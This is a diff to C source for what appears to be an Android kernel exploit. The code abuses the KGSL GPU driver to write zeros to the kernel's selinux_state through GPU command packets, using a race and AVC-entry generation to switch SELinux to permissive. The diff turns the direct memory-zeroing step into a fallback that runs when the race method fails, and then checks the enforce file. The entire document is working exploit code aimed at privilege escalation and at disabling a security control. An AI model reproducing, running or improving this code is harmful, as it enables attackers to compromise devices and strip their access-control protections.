@@ -93,6 +93,7 @@ void *race_thread(void *arg) {
     return NULL;
 }
 
+/* AVCエントリ生成 - 元の成功コードと同じ */
 void gen_avc_entries(void) {
     for (int pid = 1; pid <= 500; pid++) {
         char path[64];
@@ -134,8 +135,7 @@ int main(int argc, char **argv) {
     (void)argc;
     (void)argv;
     setbuf(stdout, NULL);
-    printf("[+] AVC bypass fixed\n");
-    printf("[*] selinux_state: 0x%lx\n", (unsigned long)FIXED_SELINUX_STATE);
+    printf("[+] AVC bypass fixed (original method)\n");
 
     int start_pipe[2], done_pipe[2], setenforce_pipe[2];
     pipe(start_pipe); pipe(done_pipe); pipe(setenforce_pipe);
@@ -207,7 +207,6 @@ int main(int argc, char **argv) {
     pthread_join(thr, NULL);
     if (!hit) {
         printf("[-] Race failed\n");
-        printf("(TдT)\n");
         return 1;
     }
     printf("[+] Race won\n");
@@ -325,34 +324,11 @@ int main(int argc, char **argv) {
             wait_timestamp(kgsl_fd, ctx, ts);
     }
 
-    printf("[*] Phase 8: Directly zero selinux_state\n");
-    {
-        memset(ib_m, 0, 0x10000);
-        uint32_t *cmd = (uint32_t *)ib_m;
-        int dw = 0;
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        int offsets[] = {0x0, 0x4, 0x8, 0xc, 0x10, 0x14, 0x18, 0x1c, 0x20};
-        for (int i = 0; i < sizeof(offsets)/sizeof(int); i++) {
-            uint64_t addr = FIXED_SELINUX_STATE + offsets[i];
-            uint32_t al, ah;
-            split64(addr, &al, &ah);
-            cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
-            cmd[dw++] = al;
-            cmd[dw++] = ah;
-            cmd[dw++] = 0;
-        }
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        __sync_synchronize();
-        unsigned int ts;
-        if (submit_ib(kgsl_fd, ctx, ib_ga, dw*4, ib_id, &ts) == 0)
-            wait_timestamp(kgsl_fd, ctx, ts);
-    }
-
-    printf("[*] Phase 9: Signal remaining children to setenforce 0\n");
+    printf("[*] Phase 8: Signal remaining children to setenforce 0\n");
     for (int i = 3; i < N_AVC_CHILD; i++) write(setenforce_pipe[1], "S", 1);
     close(setenforce_pipe[1]);
 
-    printf("[*] Phase 10: Check SELinux status\n");
+    printf("[*] Phase 9: Check SELinux status\n");
     usleep(500000);
     int success = 0;
     for (int attempt = 0; attempt < 20 && !success; attempt++) {
@@ -390,6 +366,39 @@ int main(int argc, char **argv) {
     } else {
         printf("[-] Failed (%d AVC pages found)\n", n_avc);
         printf("(TдT)\n");
+        // 保険: selinux_stateを直接ゼロにする
+        printf("[*] Trying direct selinux_state zeroing as fallback\n");
+        memset(ib_m, 0, 0x10000);
+        uint32_t *cmd = (uint32_t *)ib_m;
+        int dw = 0;
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        int offsets[] = {0x0, 0x4, 0x8, 0xc, 0x10, 0x14, 0x18, 0x1c, 0x20};
+        for (int i = 0; i < sizeof(offsets)/sizeof(int); i++) {
+            uint64_t addr = FIXED_SELINUX_STATE + offsets[i];
+            uint32_t al, ah;
+            split64(addr, &al, &ah);
+            cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
+            cmd[dw++] = al;
+            cmd[dw++] = ah;
+            cmd[dw++] = 0;
+        }
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        unsigned int ts;
+        if (submit_ib(kgsl_fd, ctx, ib_ga, dw*4, ib_id, &ts) == 0)
+            wait_timestamp(kgsl_fd, ctx, ts);
+        usleep(200000);
+        int enf2 = open("/sys/fs/selinux/enforce", O_RDONLY);
+        if (enf2 >= 0) {
+            char ec;
+            int n = read(enf2, &ec, 1);
+            close(enf2);
+            if (n == 1 && ec == '0') {
+                printf("[+] Fallback succeeded! SELinux permissive!\n");
+                printf("＼(^o^)／\n");
+                success = 1;
+            }
+        }
     }
 
     int enf = open("/sys/fs/selinux/enforce", O_RDONLY);
